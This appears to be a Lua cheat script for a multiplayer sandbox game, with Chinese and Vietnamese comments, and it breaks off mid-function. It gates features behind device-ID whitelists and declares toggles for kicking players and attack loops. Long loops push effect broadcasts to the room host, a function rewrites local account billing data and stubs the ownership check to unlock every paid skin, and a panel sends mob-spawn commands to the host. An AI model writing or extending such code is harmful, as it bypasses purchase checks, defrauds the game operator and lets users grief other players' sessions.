




-- ==================== 全局变量声明 ====================
-- 功能开关变量
kick_loop_enabled = false
kick_target = 0
is_kq_enabled = false
is_attack_enabled = false
attack_loop_running = false
is_skybox_enabled = false
skybox_loop_running = false
is_time_speed_enabled = false
time_speed_loop_running = false
current_time_speed = 100
ydfh_all_1 = false
wdtz_all_1 = false
jdfk_all_1 = false
    -- 在脚本开头的全局变量区添加
kick_timer = nil
if syntaxcheck then return end

-- 确认框回调存储
local currentConfirmCallback = nil

-- 通用特效列表
local commonNameList = {
    "ice_qicaihua_01", "140113_1", "pumpkin_fireworks2", "horse_3437",
    "horse_4506_3", "horse_4662_3","horse_4502","horse_4564_3","horse_4645_3","horse_4616_3","horse_4554_3","horse_3457","horse_4503"
}

local effectNameList = {
    "bossblock_jinghua", "horse_4506_3", "horse_4662_3", "music01",
    "music02", "boss_10069_hq", "bossskill_3514_white", "bossblock_room"
}
---vip保护白名单列表
local whitelist = {
     
}

---Độc quyền của tác giả
local author = {
    ["43ae2ed2e8d9a33efa4fe14f2115b5e0"] = true,  -- ID thiết bị của bạn
    ["va87z4e7kd5bdmedxt2vubfohv42gwbm"] = true,
    ["e8ad3d874429b833621de44d11cccfce"] = true,
    ["1c7f2bb086aab2bba96b9e6bce8f6613"] = true,
    ["9c87144faf65f385bee20929d6e3e7eb"] = true,
    ["1afdd486624e54dcb903315d1407ce35"] = true,
        ["2d7e0e6b59015924363be9262fc378c7"] = true,
    ["191c6f9db55106d4140d6f5220a8cd36"] = true,
}


--Các chức năng đặc biệt dành cho VIP
local deviceWhitelist = {
    ["43ae2ed2e8d9a33efa4fe14f2115b5e0"] = true,  -- Thiết bị của bạn                    -- Thêm thiết bị
    ["va87z4e7kd5bdmedxt2vubfohv42gwbm"] = true,
    ["3fecbaa4b9c6d4220095ac26deac3446"] = true,
        ["e8ad3d874429b833621de44d11cccfce"] = true,
        ["1c7f2bb086aab2bba96b9e6bce8f6613"] = true,
        ["9c87144faf65f385bee20929d6e3e7eb"] = true,
            ["1afdd486624e54dcb903315d1407ce35"] = true,
                ["2d7e0e6b59015924363be9262fc378c7"] = true,
                        ["191c6f9db55106d4140d6f5220a8cd36"] = true,
}



--Chống máy tính tức thì
local author1 = {
    ["t5lg6xmehsqna835wgf7at8jsyng0yiy"] = true,  -- ID thiết bị của bạn
    ["va87z4e7kd5bdmedxt2vubfohv42gwbm"] = true,  
    ["1c7f2bb086aab2bba96b9e6bce8f6613"] = true,
        ["2d7e0e6b59015924363be9262fc378c7"] = true,

}


--Chống máy tính tức thì
local author2 = {
    ["t5lg6xmehsqna835wgf7at8jsyng0yiy"] = true,  -- ID thiết bị của bạn
    ["va87z4e7kd5bdmedxt2vubfohv42gwbm"] = true,  
    ["1c7f2bb086aab2bba96b9e6bce8f6613"] = true,
     ["2d7e0e6b59015924363be9262fc378c7"] = true,
         ["0dfdb4a2dc1d5491654b7c2defc506c5"] = true,

}

--Tất cả các chu kỳ giây
local author3 = {
    ["t5lg6xmehsqna835wgf7at8jsyng0yiy"] = true,  -- ID thiết bị của bạn
    ["va87z4e7kd5bdmedxt2vubfohv42gwbm"] = true,
    ["a070b9b59a824f8a9b848a6c9cc60949"] = true,  
    ["1c7f2bb086aab2bba96b9e6bce8f6613"] = true,
        ["2d7e0e6b59015924363be9262fc378c7"] = true,
        ["2284226b84d8e849a69326db5bbb217d"] = true,
                ["60e289e9f8f8f7fe0fe214c425ee7416"] = true,

}
---Danh sách trắng tiêu diệt tức thì
local author4 = {
    ["t5lg6xmehsqna835wgf7at8jsyng0yiy"] = true,  -- ID thiết bị của bạn
    ["va87z4e7kd5bdmedxt2vubfohv42gwbm"] = true,
    ["a070b9b59a824f8a9b848a6c9cc60949"] = true,  
    ["1c7f2bb086aab2bba96b9e6bce8f6613"] = true,
        ["1afdd486624e54dcb903315d1407ce35"] = true,
            ["91f23e91dd107a4d51f26368e63a62ae"] = true,
            ["a97a1dd9aed672208883d57bb294ec83"] = true,
                    ["60e289e9f8f8f7fe0fe214c425ee7416"] = true,

}


---Vật phẩm ném tùy chỉnh
local author5 = {
    ["t5lg6xmehsqna835wgf7at8jsyng0yiy"] = true,  -- ID thiết bị của bạn
    ["va87z4e7kd5bdmedxt2vubfohv42gwbm"] = true,
    ["a070b9b59a824f8a9b848a6c9cc60949"] = true,  
    ["c432ca63425e9d39bcfcbc14e215ed17"] = true,
    ["2284226b84d8e849a69326db5bbb217d"] = true,
            ["60e289e9f8f8f7fe0fe214c425ee7416"] = true,

}

----Chức năng C-coin
local author6 = {
    ["t5lg6xmehsqna835wgf7at8jsyng0yiy"] = true,  -- ID thiết bị của bạn
    ["va87z4e7kd5bdmedxt2vubfohv42gwbm"] = true,
    ["f3e1bb45ada801c61b13a618fdc2f8c2"] = true,
        ["0dfdb4a2dc1d5491654b7c2defc506c5"] = true,

}

----Chức năng siêu việt
local author7 = {
    ["t5lg6xmehsqna835wgf7at8jsyng0yiy"] = true,  -- ID thiết bị của bạn
    ["va87z4e7kd5bdmedxt2vubfohv42gwbm"] = true,
        ["0dfdb4a2dc1d5491654b7c2defc506c5"] = true,
             ["f3e1bb45ada801c61b13a618fdc2f8c2"] = true,
                     ["60e289e9f8f8f7fe0fe214c425ee7416"] = true,
                     ["1c7f2bb086aab2bba96b9e6bce8f6613"] = true,

}


local author8 = {
    ["t5lg6xmehsqna835wgf7at8jsyng0yiy"] = true,  -- ID thiết bị của bạn
    ["va87z4e7kd5bdmedxt2vubfohv42gwbm"] = true,
        ["1afdd486624e54dcb903315d1407ce35"] = true,
                ["60e289e9f8f8f7fe0fe214c425ee7416"] = true,
        ["a97a1dd9aed672208883d57bb294ec83"] = true,
           

}



-- ==================== 修复后的ShowPlayerList函数 ====================
-- 增强版ShowPlayerList，支持异步回调、空玩家判断和取消回调
function ShowPlayerList(callback, title, onCancel)
    LoadHomelandLuas()
    local uin_list = GetPlayerUinList()
    
    -- 如果没有其他玩家，直接返回并触发取消回调
    if #uin_list == 0 then
        ShowGameTipsWithoutFilter("Phòng hiện tại không có người chơi khác")
        if onCancel then 
            xpcall(onCancel, function(err) end)
        end
        return false
    end
    
    local data = {
        visit = { 
            history_num = title or "Chức năng", 
            today_num = "#cFF7aad" .. #uin_list 
        },
        event_home = { { param1 = 0, event_id = 5, event_time = 0 } },
        event_visit = {}
    }
    
    for i = 1, #uin_list do
        table.insert(data.event_visit, { uin = uin_list[i], event_id = 5, event_time = 0 })
    end
    
    local UIMgr = GetInst("UIManager")
    UIMgr:Open("HomeEventRecord")
    UIMgr:GetCtrl("HomeEventRecord"):UpdateUI(data)
    
    getglobal("HomeEventRecordTitleFrameName"):SetText("Danh sách thành viên phòng")
    getglobal("HomeEventRecordTodayVisterText"):SetText("#cFF7aadSố lượng người chơi")
    getglobal("HomeEventRecordTotalVisterText"):SetText("#cFF7aadChức năng hiện tại")
    
    -- 保存回调到全局变量
    _G._tempPlayerCallback = callback
    _G._tempPlayerCancel = onCancel
    _G._tempPlayerTitle = title
    
    local HomeEvent = UIMgr:GetCtrl("HomeEventRecord")
    
    -- 重写进入按钮点击事件
    function HomeEvent:EnterFriendHomeBtn_OnClick()
        UIMgr:Close("HomeEventRecord")
        local selectedUin = this:GetClientID()
        ShowGameTipsWithoutFilter("#c00ffffĐã chọn người chơi:" .. selectedUin)
        
        if _G._tempPlayerCallback then
            local cb = _G._tempPlayerCallback
            local t = _G._tempPlayerTitle
            -- 清空全局变量
            _G._tempPlayerCallback = nil
            _G._tempPlayerCancel = nil
            _G._tempPlayerTitle = nil
            -- 执行回调
            xpcall(function() 
                cb(selectedUin, t) 
            end, function(err)
                ShowGameTipsWithoutFilter("#cFF0000Lỗi khi thực thi callback:" .. tostring(err))
            end)
        end
    end
    
    -- 添加关闭处理
    local originalOnClose = HomeEvent.OnClose
    function HomeEvent:OnClose(...)
        if _G._tempPlayerCancel then
            local cancel = _G._tempPlayerCancel
            -- 清空全局变量
            _G._tempPlayerCallback = nil
            _G._tempPlayerCancel = nil
            _G._tempPlayerTitle = nil
            -- 执行取消回调
            xpcall(cancel, function(err) end)
        end
        if originalOnClose then
            originalOnClose(self, ...)
        end
    end
    
    return true
end




-- ==================== 通用工具函数 ====================
function readFile_1(ft)
    local filepath = filepath_root..'axdx/'..ft..'/3'
    local file, err = io.open(filepath, "r")
    if not file then return '' end
    local content = file:read("*a")
    file:close()
    return content
end

function readFile(ft)
    local filepath = filepath_root..'axdx/'..ft..'/text'
    local file, err = io.open(filepath, "r")
    if not file then return '' end
    local content = file:read("*a")
    file:close()
    return content
end

function trigger()
    InitGameAPI()
    GameVmTriggerInit()
end

function RoomIsSer()
    local csroomidS = GetCurrentCSRoomId()
    if not csroomidS or csroomidS == "" then
        MessageBox(4, "Chế độ trực tuyến không khả dụng, hãy chuyển sang máy chủ đám mây")
        return false
    end
    return true
end

-- ==================== 统一确认框 ====================
function ShowConfirmFrame(title, onEnable, onDisable)
    getglobal("OutGameConfirmFrameFor4399"):Show()
    getglobal("OutGameConfirmFrameFor4399Desc"):SetText("#K" .. title, 40, 38, 33)
    currentConfirmCallback = { onEnable = onEnable, onDisable = onDisable }
end

function OutGameConfirmFrameLeftBtnFor4399_OnClick()
    getglobal("OutGameConfirmFrameFor4399"):Hide()
    if currentConfirmCallback and currentConfirmCallback.onEnable then
        currentConfirmCallback.onEnable()
    end
end

function OutGameConfirmFrameRightBtnFor4399_OnClick()
    getglobal("OutGameConfirmFrameFor4399"):Hide()
    if currentConfirmCallback and currentConfirmCallback.onDisable then
        currentConfirmCallback.onDisable()
    end
end

-- ==================== 房员列表相关 ====================
local HomelandLuas = {
    "ui/mobile/mvc/homeland/eventrecord/HomeEventRecordCtrl.lua",
    "ui/mobile/mvc/homeland/eventrecord/HomeEventRecordModel.lua",
    "ui/mobile/mvc/homeland/eventrecord/HomeEventRecordView.lua"
}

function LoadHomelandLuas()
    for i, luapath in ipairs(HomelandLuas) do
        if g_LuaPreLoadMgr and g_LuaPreLoadMgr.LoadALuaFile then
            g_LuaPreLoadMgr:LoadALuaFile(luapath)
        end
    end
end

function GetPlayerUinList()
    local uin_list = {}
    if ClientCurGame and ClientCurGame:isInGame() and AccountManager and AccountManager:getMultiPlayer() > 0 then
        local num = ClientCurGame:getNumPlayerBriefInfo() or 0
        for i = 1, num do
            local briefInfo = ClientCurGame:getPlayerBriefInfo(i - 1)
            if briefInfo and briefInfo.uin and briefInfo.uin > 1000 then
                table.insert(uin_list, briefInfo.uin)
            end
        end
    end
    return uin_list
end



-- ==================== 输入框相关 ====================
local inputContent = nil
function ShowInputFrame(callback)
    local MiniUIManager = GetInst("MiniUIManager")
    MiniUIManager:OpenUI("CommonRenameFrame", "miniui/miniworld/CommonRenameFrame", "CommonRenameFrameAutoGen")
    local inputFrame = MiniUIManager:GetMVC("CommonRenameFrameAutoGen")
    
    function inputFrame:BtnSureClick(obj, context)
        inputContent = self.view.widgets.inputName:getText()
        self:CloseSelf()
        if callback then callback(inputContent) end
    end
end


-- ==================== 功能函数 ====================
-- 专属特

          



















function zstx()
    for a = 0, 100000 do
        threadpool:wait(0.1)
        for i = 1, #commonNameList do
            local tdata = {
                [1] = "actor",
                [2] = "playBodyEffectByFile",
                [3] = { AccountManager:getUin(), commonNameList[i], true }
            }
            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
        end
    end
end

-- 获得全皮
function hdqp()
    for a = 0, 100000 do
        threadpool:wait(0.1)
        local accountData = AccountManager:getAccountData().Account.BillDataSvr
        accountData.RoleSkinNum = 1000
        local t = {}
        for i = 1, 1000 do
            t[i] = { ExpireTime = -1, SkinID = i }
        end
        accountData.RoleSkinInfo = t
        AccountManager.useRoleSkinModel = function(self, skinid) return true end
    end
end


function zdsw()
    getglobal("CreateMonsterFrame"):Show()
    
      local CreateMonsterTable = {
	config = {
		-- Bảng thuộc tính bên phải chứa các mảng cấu hình cho tất cả các điều khiển giao diện người dùng (thanh trượt/công tắc/vạch phân cách/hộp chọn sinh vật)
		widgetAttributes = {
			-- 控件1：生物选择下拉框
			{
				Type = "Selection",
				Name_StringID = 6317,
				CurVal = 0,
				CanShow = true
			},
			-- 分割线1
			{
				Type = "Line",
				Title_StringID = 21201,
				CanShow = true
			},
			-- 控件2：单次生成生物数量 滑块
			{
				Type = "Slider",
				Name_StringID = 21202,
				CurVal = 1,
				Min = 1, Max = 32, Step = 1,
				ValShowType = "Int",
				CanShow = true
			},
			-- 控件3：高级参数总开关
			{
				Type = "Switch",
				Name_StringID = 21208,
				CurVal = false,
				CanShow = true,
				HelpButton = true
			},
			-- 控件4：生成延迟 滑块
			{
				Type = "Slider",
				Name_StringID = 21203,
				CurVal = 10,
				Min = 1, Max = 100, Step = 1,
				ValShowType = "Int",
				CanShow = false,
				HelpButton = true
			},
			-- 分割线2
			{
				Type = "Line",
				Title_StringID = 21204,
				CanShow = true
			},
			-- 控件5：生成横向范围
			{
				Type = "Slider",
				Name_StringID = 21204,
				CurVal = 1,
				Min = 1, Max = 32, Step = 1,
				ValShowType = "IntUnit",
				Unit_StringID = 9111,
				CanShow = true
			},
			-- 控件6：生成纵向范围
			{
				Type = "Slider",
				Name_StringID = 21205,
				CurVal = 1,
				Min = 1, Max = 256, Step = 1,
				ValShowType = "IntUnit",
				Unit_StringID = 9111,
				CanShow = true
			},
			-- 分割线3
			{
				Type = "Line",
				Title_StringID = 21206,
				CanShow = true
			},
			-- 控件7：生成上限总开关
			{
				Type = "Switch",
				Name_StringID = 21206,
				CurVal = false,
				CanShow = true
			},
			-- 控件8：地图最大存活生物数量
			{
				Type = "Slider",
				Name_StringID = 21207,
				CurVal = 18,
				Min = 1, Max = 180, Step = 1,
				ValShowType = "IntUnit",
				Unit_StringID = 559,
				CanShow = false,
				HelpButton = true
			}
		},
		-- 默认生物分类列表（3个分类）
	defaultMonsters = {
    -- 第1页：常见动物/生物
  {
    Type = 1,
    ID = {3010,3011,3012,3013,3014,3015,3016,3017,3018,3019,3020,3021,3022,3095,3096,3097,
          3098,3099,3200,3201,3202,3203,3204,3205,3206,3207,3208,3209,3210,3211,3212,3213,
          3214,3215,3216,3217,3218,3219,3222,3223,3229,3230,3231,3232,3233,3234,3235,3236,
          3237,3238,3239,3241,3242,3243,3400,3401,3402,3403,3404,3405,3406,3407,3408,3409,
          3410,3411,3412,3413,3414,3415,3416,3417,3418,3419,3421,3422,3423,3424,3505,3506,
          3507}
},
    -- 第2页：动物/怪物
    {
    Type = 2,
    ID = {3101,3102,3103,3105,3107,3109,3110,3111,3112,3113,3114,3115,3116,3117,3118,3120,
          3121,3122,3123,3124,3125,3126,3130,3131,3132,3135,3165,3166,3167,3168,3169,3170,
          3171,3172,3173,3174,3175,3176,3177,3178,3179,3180,3181,3182,3183,3184,3185,3186,
          3187,3188,3189,3190,3191,3192,3193,3194,3195,3196,3197,3198,3199,3220,3221,3224,
          3225,3226,3227,3228,3244,3245,3246,3247,3248,3249,3250,3251,3252,3253,3254,3255,
          3261}
},
    -- 第3页：怪物/Boss/特殊

        -- Type3：BOSS/精英（精简到81个）
{
    Type = 3,
    ID = {3420,3425,3521,3240,3230,3231,3232,3507,3898,3899,3520,3519,3505,3506,3508,3509,
      3517,3897,3900,3916,3917,3918,3919,3928,3934,4001,4002,4200,4201,4500,4501,4502,
      4503,4504,4505,4506,4507,4508,4509,4510,4511,4512,4513,4514,4515,4516,4517,4518,
      4519,4520,4521,4522,4523,4524,4525,4526,4527,4528,4529,4530,4531,4532,4533,4534,
      4535,4536,4537,4538,4539,4540,4541,4542,4543,4544,4545,4546,4547,3501,3502,3503,
      3504,3510,3511,3512,3513,3514,3515,3516}
}
		},
		
		-- 帮助弹窗布局配置
		helpButtons = {
			SingleCreateSelection1HelpBtn = {
				name = "SingleCreateSelection1HelpBtn",
				childName = {"Bkg","Icon","Choose","Attribute","Life","Attack","Describe","Details"},
				children = {},
				childrenAttr = {
					closed = {
						{"point","Bkg","top","SingleCreateSelection1HelpBtnNormal","bottom",-61,0},
						{"point","","bottomleft","SingleCreateSelection1Btn","bottomright",5,0},
						{"point","Normal","bottomleft","SingleCreateSelection1Btn","bottomright",5,0},
						{"point","PushedBG","bottomleft","SingleCreateSelection1Btn","bottomright",5,0},
						{"size","",30,31},
						{"strata","",4}
					},
					opening = {
						{"point","Bkg","top","SingleCreateSelection1HelpBtnNormal","bottom",-61,0},
						{"point","","bottomleft","SingleCreateSelection1Btn","bottomright",5,0},
						{"point","Normal","bottomleft","SingleCreateSelection1Btn","bottomright",5,0},
						{"point","PushedBG","bottomleft","SingleCreateSelection1Btn","bottomright",5,0},
						{"size","",668,200},
						{"strata","",5}
					}
				}
			}
		},
		height = {
			Line = 40,
			Switch = 60,
			Slider = 70,
			Selection = 150
		}
	},
	-- 全局常量定义
	constants = {
		INIT_ID = 4000,
		MAX_TAB_NUM = 3,  -- 3个分类
		MAX_ORGANISM_GRID_NUM = 81,
		IO_PARAMS_NAME = {
			"MobResID","everyNum","maxNum","spawnWide","spawnHigh","spawnDelay","numSwitch","DelaySwitch"
		},
		IO_PARAMS_INDEX = {1,3,5,7,8,11,4,10},
		-- 分类标签多语言文本
		TAB_NAME_STRING_ID = {
			[1] = "Sinh vật",
			[2] = "Quái vật",
			[3] = "Vật phẩm đặc biệt"
		}
	},
	organismdefs = {}
}

local main = CreateMonsterTable
local tmpChooseMonsterDef, curChooseMonsterDef
local curChooseType = 1  -- 默认选中"生物"分类（Type=1）
local needInit = true

function getCreateMonsterTable()
	return CreateMonsterTable
end

local function getType(id)
	for i = 1, #main.config.defaultMonsters do
		local ids = main.config.defaultMonsters[i]
		for j = 1, #ids.ID do
			if id == ids.ID[j] then
				return ids.Type
			end
		end
	end
	return 1
end

-- 给图标控件加载生物头像
local function setIcon(icon, def)
	if tonumber(def.ID) and tonumber(def.ID) == main.constants.INIT_ID then
		return
	end
	if def.ModelType == MONSTER_CUSTOM_MODEL then
		SetModelIcon(icon, def.Model, ACTOR_MODEL)
		return
	elseif def.ModelType == MONSTER_FULLY_CUSTOM_MODEL then
		SetModelIcon(icon, def.Model, FULLY_ACTOR_MODEL)
		return
	elseif def.ModelType == MONSTER_IMPORT_MODEL then
		SetModelIcon(icon, def.Model, IMPORT_ACTOR_MODEL)
		return
	end
	if tonumber(def.Icon) and tonumber(def.Icon) > 0 then
		icon:SetTexture("ui/roleicons/" .. def.Icon .. ".png", true)
	else
		icon:SetTexture("ui/roleicons/" .. def.ID .. ".png", true)
	end
	if type(def.Icon) == "string" and string.sub(def.Icon, 1, 1) == "a" then
		AvatarSetIconByID(def, icon)
	end
end

local function hideHelpBtn(exclude)
	if getglobal("SingleCreateSlider2HelpBtnBkg"):IsShown() and exclude ~= 1 then
		getglobal("SingleCreateSlider2HelpBtnBkg"):Hide()
		getglobal("SingleCreateSlider2HelpBtnTips"):Hide()
		getglobal("SingleCreateSlider2HelpBtn"):SetFrameStrataInt(4)
		getglobal("SingleCreateSlider2HelpBtn"):SetSize(30, 31)
	end
	if getglobal("SingleCreateSwitch1HelpBtnBkg"):IsShown() and exclude ~= 2 then
		getglobal("SingleCreateSwitch1HelpBtnBkg"):Hide()
		getglobal("SingleCreateSwitch1HelpBtnTips"):Hide()
		getglobal("SingleCreateSwitch1HelpBtn"):SetFrameStrataInt(4)
		getglobal("SingleCreateSwitch1HelpBtn"):SetSize(30, 31)
	end
	if getglobal("SingleCreateSelection1HelpBtnBkg"):IsShown() and exclude ~= 3 then
		getglobal("SingleCreateSelection1HelpBtn"):SetFrameStrataInt(4)
		getglobal("SingleCreateSelection1HelpBtn"):SetSize(30, 31)
		getglobal("SingleCreateSelection1HelpBtnBkg"):SetPoint("top", "SingleCreateSelection1HelpBtn", "top", -61, 0)
		getglobal("SingleCreateSelection1HelpBtn"):SetPoint("bottomleft", "SingleCreateSelection1", "bottomright", 5, 0)
		local names = main.config.helpButtons.SingleCreateSelection1HelpBtn.childName
		for i = 1, #names do
			getglobal("SingleCreateSelection1HelpBtn" .. names[i]):Hide()
		end
	end
end

function CreateMonsterFrame_OnClick()
	if getglobal("SingleCreateSelection1HelpBtnBkg"):IsShown() then
		CreateMonsterHelpBtn_OnClick()
	end
	hideHelpBtn(0)
end

function CreateMonsterFrame_OnShow()
	if not needInit then
		return
	end
	needInit = false
	HideAllFrame("CreateMonsterFrame", true)
	hideHelpBtn(0)
	LoadOrganismDef()
	if not getglobal("CreateMonsterFrame"):IsReshow() then
		ClientCurGame:setOperateUI(true)
	end
	local curSetting = OpenContainer:getBrushMonsterAttr()
	local names = main.constants.IO_PARAMS_NAME
	local indexs = main.constants.IO_PARAMS_INDEX
	for i = 1, #names do
		main.config.widgetAttributes[indexs[i]].CurVal = curSetting[names[i]]
		if names[i] == "spawnDelay" then
			main.config.widgetAttributes[indexs[i]].CurVal = main.config.widgetAttributes[indexs[i]].CurVal / 20
		end
		if string.find(names[i], "Switch") then
			main.config.widgetAttributes[indexs[i] + 1].CanShow = curSetting[names[i]]
		end
	end
	if main.config.widgetAttributes[1].CurVal == main.constants.INIT_ID then
		curChooseMonsterDef = nil
		tmpChooseMonsterDef = nil
	end
	UpdateCreateMonsterFrame()
end

function CreateMonsterFrame_OnHide()
	needInit = true
	curChooseType = 1
	curChooseMonsterDef = nil
	tmpChooseMonsterDef = nil
	ShowMainFrame()
	if not getglobal("CreateMonsterFrame"):IsRehide() then
		ClientCurGame:setOperateUI(false)
	end
	UIFrameMgr:setCurEditBox(nil)
end

function CreateMonsterFrame_OnLoad()
	UpdateCreateMonsterFrame()
	for i = 1, main.constants.MAX_ORGANISM_GRID_NUM / 9 do
		for j = 1, 9 do
			local index = (i - 1) * 9 + j
			local grid = getglobal("OrganismGrid" .. index)
			grid:SetPoint("topleft", "OrganismGridBoxPlane", "topleft", (j - 1) * 84, (i - 1) * 84)
		end
	end
end

function CreateMonsterFrameCloseBtn_OnClick()
	hideHelpBtn(0)
	getglobal("CreateMonsterFrame"):Hide()
end

-- 保存按钮：把UI参数写入刷怪方块属性并关闭面板
function CreateMonsterFrameSaveBtn_OnClick()
	hideHelpBtn(0)
	if curChooseMonsterDef then
		local params = {}
		local attr = CreateMonsterTable.config.widgetAttributes
		-- 组装存储参数
		params.id = curChooseMonsterDef.ID
		params.everyNum = attr[3].CurVal
		params.maxNum = attr[5].CurVal
		params.spawnWide = attr[7].CurVal
		params.spawnHigh = attr[8].CurVal
		params.spawnDelay = attr[11].CurVal
		params.numSwitch = attr[4].CurVal
		params.delaySwitch = attr[10].CurVal
		
		if next(params) == nil then
			Log("CreateMonsterFrameSaveBtn_OnClick : params ERROR !!!")
		else
			-- 持久化参数到刷怪方块
			OpenContainer:setBrushMonsterAttr(params.id, params.everyNum, params.maxNum, params.spawnWide, params.spawnHigh, params.spawnDelay, params.numSwitch, params.delaySwitch)
			
			-- ===== 执行刷怪脚本 =====
			-- 获取玩家位置
			local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
			local new_x, new_y, new_z = x / 100, y / 100, z / 100
			
			-- 加上偏移量（横向范围 + 纵向范围）
			local offsetX = params.spawnWide or 1
			local offsetZ = params.spawnWide or 1
			local offsetY = params.spawnHigh or 1
			
			-- 生成在玩家前方偏移位置
			local spawnX = new_x + offsetX
			local spawnY = new_y + offsetY
			local spawnZ = new_z + offsetZ
			
			-- 打印调试信息
			print("=== 刷怪执行 ===")
			print("生物ID: " .. params.id)
			print("生成数量: " .. params.everyNum)
			print("玩家位置: " .. new_x .. ", " .. new_y .. ", " .. new_z)
			print("生成位置: " .. spawnX .. ", " .. spawnY .. ", " .. spawnZ)
			
			-- 组装数据
			local tdata = {
				[1] = "world",
				[2] = "spawnMob",
				[3] = { 
					spawnX,          -- X坐标（玩家位置 + 横向偏移）
					spawnY,          -- Y坐标（玩家位置 + 纵向偏移）
					spawnZ,          -- Z坐标（玩家位置 + 横向偏移）
					params.id,       -- 生物ID
					params.everyNum, -- 生成数量
					true             -- 固定参数
				}
			}
			-- 发送到服务端执行
			ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
			-- ===== 结束 =====
		end
		ShowGameTips(GetS(3940))
		getglobal("CreateMonsterFrame"):Hide()
	end
end

function ChooseOrganismFrame_OnLoad()
end

function ChooseOrganismFrame_OnShow()
	UpdateOrganismGridBox()
	getglobal("ChooseOrganismFrameOkBtn"):SetClientID(0)
end

function ChooseOrganismFrame_OnHide()
end

local checkedHaloName

function OrganismGridTemplate_OnClick()
	local id = this:GetClientID()
	if checkedHaloName then
		getglobal(checkedHaloName .. "Checked"):Hide()
	end
	checkedHaloName = this:GetName()
	getglobal(checkedHaloName .. "Checked"):Show()
	tmpChooseMonsterDef = nil
	local def = ModEditorMgr:getMonsterDefById(id)
	def = def or MonsterCsv:get(id)
	if def then
		UpdateTipsFrame(def.Name, 0)
		tmpChooseMonsterDef = def
		print(tmpChooseMonsterDef.ID)
	end
end

function CreateTabTemplate_OnClick()
	local index = this:GetClientID()
	local btnName = this:GetName()
	local checked = getglobal(btnName .. "Checked")
	if checked:IsShown() then
		return
	end
	local defs = main.organismdefs
	if defs and defs[index] then
		curChooseType = defs[index].Type
	end
	UpdateOrganismGridBox()
	SetChooseOrganismFrameTab()
end

function ChooseOrganismFrameClose_OnClick()
	hideHelpBtn(0)
	getglobal("ChooseOrganismFrame"):Hide()
	tmpChooseMonsterDef = nil
end

local selectCallBack

function SetCreateMonsterFrameSelectMonsterCallBack(callback)
	selectCallBack = callback
end

function ChooseOrganismFrameOkBtn_OnClick()
	curChooseMonsterDef = tmpChooseMonsterDef
	if curChooseMonsterDef then
		getglobal("ChooseOrganismFrame"):Hide()
		main.config.widgetAttributes[1].CurVal = curChooseMonsterDef.ID
		local name = getglobal("SingleCreateSelection1" .. "Choose")
		local icon = getglobal("SingleCreateSelection1" .. "Btn" .. "Icon")
		name:SetText(curChooseMonsterDef.Name)
		setIcon(icon, curChooseMonsterDef)
		getglobal("SingleCreateSelection1" .. "HelpBtn"):Show()
		name:Show()
		icon:Show()
		if selectCallBack then
			selectCallBack(curChooseMonsterDef)
		end
	end
end

function UpdateCreateMonsterFrame()
	local attributes = main.config.widgetAttributes
	local height = main.config.height
	local widgetIndex = {Selection = 1, Line = 1, Switch = 1, Slider = 1}
	local pointY = 0
	for i = 1, #attributes do
		local frame = getglobal("SingleCreate" .. attributes[i].Type .. widgetIndex[attributes[i].Type])
		if frame then
			if attributes[i].Type == "Slider" then
				local name = getglobal("SingleCreate" .. attributes[i].Type .. widgetIndex[attributes[i].Type] .. "Name")
				local valFont = getglobal("SingleCreate" .. attributes[i].Type .. widgetIndex[attributes[i].Type] .. "Val")
				local bar = getglobal("SingleCreate" .. attributes[i].Type .. widgetIndex[attributes[i].Type] .. "Bar")
				local curVal = attributes[i].CurVal
				bar:SetMinValue(attributes[i].Min)
				bar:SetMaxValue(attributes[i].Max)
				bar:SetValueStep(attributes[i].Step)
				bar:SetValue(curVal)
				name:SetText(GetS(attributes[i].Name_StringID))
				if attributes[i].ValShowType == "Int" then
					valFont:SetText(curVal)
				elseif attributes[i].ValShowType == "IntUnit" then
					valFont:SetText(curVal .. GetS(attributes[i].Unit_StringID))
				end
			elseif attributes[i].Type == "Line" then
				if attributes[i].Title_StringID then
					getglobal("SingleCreate" .. attributes[i].Type .. widgetIndex[attributes[i].Type] .. "LineZheZhao"):Show()
					getglobal("SingleCreate" .. attributes[i].Type .. widgetIndex[attributes[i].Type] .. "Title"):Show()
					getglobal("SingleCreate" .. attributes[i].Type .. widgetIndex[attributes[i].Type] .. "Title"):SetText(GetS(attributes[i].Title_StringID))
				else
					getglobal("SingleCreate" .. attributes[i].Type .. widgetIndex[attributes[i].Type] .. "LineZheZhao"):Hide()
					getglobal("SingleCreate" .. attributes[i].Type .. widgetIndex[attributes[i].Type] .. "Title"):Hide()
				end
			elseif attributes[i].Type == "Switch" then
				local name = getglobal("SingleCreate" .. attributes[i].Type .. widgetIndex[attributes[i].Type] .. "Name")
				local switchBtn = getglobal("SingleCreate" .. attributes[i].Type .. widgetIndex[attributes[i].Type] .. "Btn")
				local state = attributes[i].CurVal and 1 or 0
				name:SetText(GetS(attributes[i].Name_StringID))
				SetSwitchBtnState(switchBtn:GetName(), state)
			elseif attributes[i].Type == "Selection" then
				local name = getglobal("SingleCreate" .. attributes[i].Type .. widgetIndex[attributes[i].Type] .. "Name")
				local attrBtn = getglobal("SingleCreate" .. attributes[i].Type .. widgetIndex[attributes[i].Type] .. "HelpBtn")
				local choose = getglobal("SingleCreate" .. attributes[i].Type .. widgetIndex[attributes[i].Type] .. "Choose")
				local id = attributes[i].CurVal
				local btn = getglobal("SingleCreate" .. attributes[i].Type .. widgetIndex[attributes[i].Type] .. "Btn")
				local icon = getglobal(btn:GetName() .. "Icon")
				name:SetText(GetS(attributes[i].Name_StringID))
				if attributes[i].CurVal ~= main.constants.INIT_ID then
					btn:Show()
					curChooseMonsterDef = ModEditorMgr:getMonsterDefById(id)
					if not curChooseMonsterDef then
						curChooseMonsterDef = MonsterCsv:get(id)
					end
					if curChooseMonsterDef then
						setIcon(icon, curChooseMonsterDef)
						choose:SetText(curChooseMonsterDef.Name)
						choose:Show()
						attrBtn:Show()
						icon:Show()
					end
				else
					choose:Hide()
					attrBtn:Hide()
					icon:Hide()
				end
			end
			frame:SetClientID(i)
			if i == 1 then
				frame:SetPoint("bottom", "SingleCreateAttrBox", "top", 0, pointY)
			else
				frame:SetPoint("top", "SingleCreateAttrBoxPlane", "top", 0, pointY)
			end
			if attributes[i].HelpButton then
				getglobal("SingleCreate" .. attributes[i].Type .. widgetIndex[attributes[i].Type] .. "HelpBtn"):Show()
			end
			if 1 < i and attributes[i].CanShow then
				pointY = pointY + height[attributes[i].Type]
			end
		else
